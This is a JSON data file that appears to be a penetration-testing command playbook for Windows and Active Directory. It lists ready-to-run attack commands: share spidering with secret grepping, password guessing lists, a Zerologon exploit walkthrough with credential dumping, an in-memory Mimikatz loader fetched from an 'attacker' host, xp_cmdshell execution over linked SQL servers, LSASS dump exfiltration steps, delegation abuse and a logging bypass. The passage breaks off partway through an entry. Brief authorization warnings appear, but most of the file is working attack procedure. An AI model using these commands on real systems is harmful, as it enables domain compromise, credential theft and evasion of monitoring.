        "title": "Enum4Linux",
        "codes": [
          {
            "lang": "bash",
            "code": "enum4linux-ng -A <TargetIP> -u '<Username>' -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SMBMap",
        "substeps": [
          {
            "title": "Recursive Listing",
            "codes": [
              {
                "lang": "bash",
                "code": "smbmap -H <TargetIP> -u '<Username>' -p '<Password>' -r <Share>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "With Domain",
            "codes": [
              {
                "lang": "bash",
                "code": "smbmap -H <TargetIP> -u '<Username>' -p '<Password>' -d <Domain>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "smbmap -H <TargetIP> -u '<Username>' -p '<Password>'"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "Enumerates shares and checks permissions with credentials.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "NetExec",
        "substeps": [
          {
            "title": "Directory Setup",
            "codes": [
              {
                "lang": "bash",
                "code": "mkdir -p /root/machines/<Machine>/<TargetIP>/netexec && cd /root/machines/<Machine>/<TargetIP>/netexec"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Users",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u '<Username>' -p '<Password>' --users"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Shares",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u '<Username>' -p '<Password>' --shares"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Download All Files from Every Accessible Share",
            "codes": [
              {
                "lang": "bash",
                "code": "netexec smb <TargetIP> -u '<Username>' -p '<Password>' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/root/machines/<Machine>/<TargetIP>/netexec"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Grep Output",
            "codes": [
              {
                "lang": "bash",
                "code": "grep -rniE 'pass|password|passwd|pwd|secret|api[_-]?key|apikey|token|auth|credential|private[_-]?key' /root/machines/<Machine>/<TargetIP>/netexec"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Cat Output (Lots of Lines if Big Files)",
            "codes": [
              {
                "lang": "bash",
                "code": "find /root/machines/<Machine>/<TargetIP>/netexec -type f -exec cat {} \\;"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Groups",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc ldap <TargetIP> -u '<Username>' -p '<Password>' --groups"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Administrator Group Members",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc ldap <TargetIP> -u '<Username>' -p '<Password>' --groups Administrators"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Domain Admin Members",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc ldap <TargetIP> -u '<Username>' -p '<Password>' --groups 'Domain Admins'"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Enterprise Admins",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc ldap <TargetIP> -u '<Username>' -p '<Password>' --groups 'Enterprise Admins'"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Group Counts",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc ldap <TargetIP> -u '<Username>' -p '<Password>' --groups | egrep -iv 'membercount: 0'"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Password Policy",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u '<Username>' -p '<Password>' --pass-pol"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Computers",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc ldap <TargetIP> -u '<Username>' -p '<Password>' --computers"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Qwinsta",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u '<Username>' -p '<Password>' --qwinsta"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Local-Groups",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u '<Username>' -p '<Password>' --local-groups"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Administrator Local Group Members",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u '<Username>' -p '<Password>' --local-groups Administrators"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "RID Brute",
            "codes": [
              {
                "lang": "bash",
                "code": "nxc smb <TargetIP> -u '<Username>' -p '<Password>' --rid-brute 10000"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SMB Client",
        "substeps": [
          {
            "title": "Upload File",
            "codes": [
              {
                "lang": "bash",
                "code": "put <LocalFile>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Download File",
            "codes": [
              {
                "lang": "bash",
                "code": "get <RemoteFile>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Recursive Download",
            "codes": [
              {
                "lang": "bash",
                "code": "mask \"\"\nrecurse ON\nprompt OFF\nmget *"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Downloads all files and subdirectories from current location.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "smbclient //<TargetIP>/<Share> -U '<Domain_Local>/<Username>%<Password>'"
          }
        ]
      },
      {
        "title": "Mounting SMB Shares",
        "substeps": [
          {
            "title": "Mount CIFS Share",
            "codes": [
              {
                "lang": "bash",
                "code": "sudo mount -t cifs -o 'user=<Username>,password=<Password>' //<TargetIP>/<Share> /mnt/<MountPoint>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "List Mounted Contents",
            "codes": [
              {
                "lang": "bash",
                "code": "ls -latRr /mnt/<MountPoint>"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SMB Permissions",
        "substeps": [
          {
            "title": "Check ACL with smbcacls",
            "codes": [
              {
                "lang": "bash",
                "code": "smbcacls --no-pass //<TargetIP>/<Share> <RemotePath>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Displays Windows-style ACLs on files/directories within an SMB share.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "With Credentials",
            "codes": [
              {
                "lang": "bash",
                "code": "smbcacls //<TargetIP>/<Share> <RemotePath> -U '<Username>'"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**What \"(Pwn3d!)\" means in NetExec output:**\n- **Pwn3d!** = Local administrator privileges on target (can dump SAM/LSA/NTDS, execute commands, perform lateral movement)\n- **No Pwn3d!** = Valid credentials but NOT local admin (can enumerate shares/users/groups, Kerberoast, ASREPRoast, but cannot dump credentials or execute)",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Resource-Based Constrained Delegation",
    "title": "Enumeration",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "BloodHound Queries",
        "codes": [
          {
            "lang": "cypher",
            "code": "# Find write access to computers\nMATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer) RETURN p"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PowerView Enumeration",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { \n  $_.ActiveDirectoryRights -match \"WriteProperty|GenericAll|GenericWrite\" \n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check MachineAccountQuota",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADObject -Identity \"DC=<Domain>,DC=<TLD>\" -Properties ms-DS-MachineAccountQuota"
          },
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DC-IP> -D \"<User>@<Domain>\" -w \"<Password>\" -b \"DC=<Domain>,DC=<TLD>\" \"(objectClass=domain)\" ms-DS-MachineAccountQuota"
          },
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p <Pass> -M maq"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Find Existing RBCD Configurations",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation"
          },
          {
            "lang": "bash",
            "code": "impacket-findDelegation <Domain>/<User>:<Pass> -dc-ip <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "NetExec",
    "title": "Enumeration Modules",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enumerate Shares",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --shares"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Users",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --users"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Groups",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --groups"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Local Groups",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --local-groups"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Logged On Users",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --loggedon-users"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Domain Controllers",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --dc-list"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Password Policy",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --pass-pol"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Critical for password spraying - shows lockout threshold and reset time.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Enumerate Sessions",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --sessions"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Disks",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --disks"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Enumeration With Credentials",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "NetExec Comprehensive Enum",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec smb <DC_IP> -u <User> -p <Pass> --shares\nnetexec smb <DC_IP> -u <User> -p <Pass> --users\nnetexec smb <DC_IP> -u <User> -p <Pass> --groups\nnetexec smb <DC_IP> -u <User> -p <Pass> --pass-pol\nnetexec smb <DC_IP> -u <User> -p <Pass> -M spider_plus\nnetexec ldap <DC_IP> -u <User> -p <Pass> -M get-desc-users\nnetexec ldap <DC_IP> -u <User> -p <Pass> --computers"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "ldapdomaindump",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapdomaindump -u \"<Domain>\\\\<User>\" -p \"<Pass>\" ldap://<DC_IP>\nsudo ldapdomaindump ldaps://<DC_IP> -u '<Domain>\\<Username>' -p '<Password>' -o <OutputDirectory>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Dumps comprehensive AD information via LDAP. Outputs HTML reports, JSON, and grep-friendly text."
          }
        ]
      },
      {
        "title": "RID Cycling - Authenticated",
        "codes": [
          {
            "lang": "bash",
            "code": "lookupsid.py <Domain>/<User>:<Password>@<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "BloodHound Collection",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec ldap <DC_IP> -u <User> -p <Pass> --bloodhound -ns <DC_IP> -c All\nbloodhound-python -d <Domain> -dc <DC> -c All -u '<User>' -p '<Pass>' -ns <DC_IP>"
          },
          {
            "lang": "powershell",
            "code": "SharpHound.exe -c All\nSharpHound.exe -c All --ldapusername <User> --ldappassword <Pass>\nInvoke-BloodHound -CollectionMethod All"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Enumeration Without Credentials",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Kerberos Port 88 Enumeration",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -sV -p 88 <DC_IP>\nnmap -p 88,389,445,464,3268 -sV <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Username Enumeration - Kerbrute",
        "codes": [
          {
            "lang": "bash",
            "code": "kerbrute userenum -d <Domain> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Enumerate valid AD usernames via Kerberos pre-auth. No credentials required.\nValid user returns `KDC_ERR_PREAUTH_REQUIRED`. Invalid user returns `KDC_ERR_C_PRINCIPAL_UNKNOWN`."
          },
          {
            "type": "note",
            "content": "**Recommended wordlists:**\n`/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`\nCustom list based on company naming convention (first.last, flast, firstl)\nNames from LinkedIn, company website, OSINT"
          }
        ]
      },
      {
        "title": "Nmap Kerberos User Enumeration",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<Domain>',userdb=<UsernameFile> <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "RID Cycling - Anonymous",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec smb <DC_IP> -u '' -p '' --rid-brute\nlookupsid.py anonymous@<DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Enumerate users via SID brute-forcing. Works with null session if allowed."
          }
        ]
      },
      {
        "title": "LDAP Anonymous Bind",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts\nldapsearch -x -H ldap://<DC_IP> -b \"DC=corp,DC=local\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump LDAP Users - GetADUsers",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetADUsers -all -no-pass -dc-ip <DC_IP> <Domain>/\nimpacket-GetADUsers -all -dc-ip <DC_IP> <Domain>/<User>:<Password>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Enumerate all domain users via LDAP. Requires valid credentials or anonymous bind."
          }
        ]
      },
      {
        "title": "Initial Credential Guessing",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u users.txt -p users.txt -d <Domain> --continue-on-success\nnxc smb <TargetIP> -u administrator -p password -d <Domain>\nnxc smb <TargetIP> -u admin -p admin --local-auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Try obvious passwords before large-scale spraying."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "**Common Password Patterns:**\n**Seasonal:** Spring2024!, Winter2024!, Summer2024!, Fall2024!\n**Monthly:** January2024!, December2024!\n**Company-based:** CompanyName1!, CompanyName123!\n**Defaults:** Welcome1!, Changeme1!, P@ssw0rd!"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Zerologon",
    "title": "Ethical Considerations",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Zerologon is a DESTRUCTIVE attack that can break production domains.",
        "variant": "warning"
      },
      {
        "type": "text",
        "content": "**Never use Zerologon on:**\n- Production environments without explicit authorization\n- Client networks without backup/restore plan\n- Systems you don't have permission to break"
      },
      {
        "type": "text",
        "content": "**Always:**\n- Get written authorization\n- Have backup/restore plan\n- Save original DC password hash\n- Restore DC password immediately after exploitation\n- Document all actions for client"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Evasion and OpSec",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Avoid Detection",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **Use offline dumps** - Dump LSASS with procdump, analyze offline\n2. **Use Invoke-Mimikatz** - PowerShell version, runs in memory\n3. **Obfuscate binary** - Rename mimikatz.exe, modify strings\n4. **Use alternatives** - pypykatz (Python), SharpKatz (C#)"
          }
        ]
      },
      {
        "title": "Invoke-Mimikatz (PowerShell)",
        "codes": [
          {
            "lang": "powershell",
            "code": "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "pypykatz (Python Alternative)",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali - parse LSASS dump\npypykatz lsa minidump lsass.dmp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Security Headers Scanning",
    "title": "Example Analysis",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# Quick header check\ncurl -I https://example.com"
      },
      {
        "type": "text",
        "content": "# Output analysis:\n# Server: Apache/2.4.41 \u2192 Search for Apache 2.4.41 CVEs\n# X-Powered-By: PHP/7.4.3 \u2192 Search for PHP 7.4.3 CVEs\n# Missing CSP \u2192 Test for XSS vulnerabilities\n# Missing X-Frame-Options \u2192 Test for clickjacking\n# Missing HSTS \u2192 Note for report (SSL strip possible)\n```"
      }
    ]
  },
  {
    "category": "Linked SQL Server Attacks",
    "title": "Executing Commands via Links",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enable xp_cmdshell on Linked Server",
        "codes": [
          {
            "lang": "sql",
            "code": "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [<LinkedServer>]\nEXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [<LinkedServer>]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Execute Commands",
        "codes": [
          {
            "lang": "sql",
            "code": "EXEC ('xp_cmdshell ''whoami''') AT [<LinkedServer>]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Via OPENQUERY",
        "codes": [
          {
            "lang": "sql",
            "code": "SELECT * FROM OPENQUERY(\"<LinkedServer>\", 'SELECT * FROM OPENQUERY(\"<SecondLinkedServer>\", ''SELECT SYSTEM_USER'')')"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Offline Credential Processing",
    "title": "Exfiltration",
    "tags": [
      "Credential_Access",
      "Windows"
    ],
    "steps": [
      {
        "title": "Compress Before Exfil",
        "codes": [
          {
            "lang": "powershell",
            "code": "Compress-Archive -Path C:\\Windows\\Temp\\lsass.dmp -DestinationPath C:\\Windows\\Temp\\lsass.zip"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Base64 Encode",
        "codes": [
          {
            "lang": "powershell",
            "code": "$bytes = [System.IO.File]::ReadAllBytes(\"C:\\Windows\\Temp\\lsass.dmp\")\n$b64 = [Convert]::ToBase64String($bytes)\n$b64 | Out-File C:\\Windows\\Temp\\lsass.b64"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Decode on Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "base64 -d lsass.b64 > lsass.dmp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Zerologon",
    "title": "Exploitation",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Step 1: Test for Vulnerability",
        "codes": [
          {
            "lang": "bash",
            "code": "git clone https://github.com/dirkjanm/CVE-2020-1472.git\ncd CVE-2020-1472\npython3 zerologon_tester.py <DC-NetBIOS-Name> <DC-IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Exploit Zerologon (Reset DC Password)",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 cve-2020-1472-exploit.py <DC-NetBIOS-Name> <DC-IP>"
          },
          {
            "lang": "bash",
            "code": "python3 cve-2020-1472-exploit.py DC01 192.168.1.10"
          },
          {
            "lang": "text",
            "code": "Success! DC can be fully compromised by a Zerologon attack."
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "At this point, the DC computer account password is set to empty string.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Step 3: Dump Domain Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -just-dc -no-pass '<Domain>/<DC-NetBIOS-Name>$@<DC-IP>'"
          },
          {
            "lang": "bash",
            "code": "impacket-secretsdump -just-dc -no-pass 'corp.local/DC01$@192.168.1.10'"
          },
          {
            "lang": "text",
            "code": "Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6...:::"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Restore DC Password (CRITICAL)",
        "substeps": [
          {
            "title": "Method 1: Using Saved Hash",
            "codes": [
              {
                "lang": "bash",
                "code": "# First, get the original DC hash BEFORE exploitation\nimpacket-secretsdump '<Domain>/<Username>:<Password>@<DC-IP>' -just-dc-user '<DC-NetBIOS-Name>$'\n\n# After exploitation, restore using the saved hash\npython3 restorepassword.py <Domain>/<DC-NetBIOS-Name>$@<DC-NetBIOS-Name> -target-ip <DC-IP> -hexpass <OriginalHash>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Method 2: Using Administrator Hash",
            "codes": [
              {
                "lang": "bash",
                "code": "# Use dumped Administrator hash to restore DC password\nimpacket-secretsdump -hashes :<AdminNTLMHash> '<Domain>/Administrator@<DC-IP>' -just-dc-user '<DC-NetBIOS-Name>$'"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "You MUST restore the original DC password or the domain will break.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "This attack is DESTRUCTIVE - it breaks the domain controller until restored.",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Just Enough Administration (JEA)",
    "title": "Exploitation via Misconfiguration",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "Wildcard Function Definitions",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Check for overly permissive configurations\n(Import-PowerShellDataFile .\\role.psrc).VisibleFunctions"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If role allows `*` for **VisibleFunctions**, all functions available.",
            "variant": "danger"
          }
        ]
      },
      {
        "title": "Script Block Logging Bypass",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Disable script block logging in session\n$settings = [System.Management.Automation.PSInvocationSettings]::new()\n$settings.LogPipelineExecutionDetails = $false"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Constrained Delegation",
    "title": "Exploiting Constrained Delegation",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "Rubeus S4U Attack",
        "substeps": [
          {
            "title": "With AES Key",
            "codes": [
              {
                "lang": "bash",
                "code": "Rubeus.exe s4u /user:<ServiceAccount> /aes256:<AESKey> /impersonateuser:Administrator /msdsspn:<AllowedSPN> /ptt"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "Rubeus.exe s4u /user:<ServiceAccount> /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:<AllowedSPN> /ptt"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "Requires password/hash of account with constrained delegation.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Impacket getST",
        "codes": [
          {
            "lang": "bash",
            "code": "# With password\nimpacket-getST -spn <AllowedSPN> -impersonate Administrator -dc-ip <DC-IP> <Domain>/<ServiceAccount>:<Password>"
          },
          {
            "lang": "bash",
            "code": "# With hash\nimpacket-getST -spn <AllowedSPN> -impersonate Administrator -hashes :<NTHash> -dc-ip <DC-IP> <Domain>/<ServiceAccount>"
          },
          {
            "lang": "bash",
            "code": "# Use the ticket\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Validate Access",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <Target> -u Administrator -k --use-kcache"
          },
          {
            "lang": "bash",
            "code": "impacket-secretsdump -k -no-pass <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Just-In-Time (JIT) Access",
    "title": "Exploiting JIT",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "Request Elevation",
        "codes": [
          {
            "lang": "powershell",
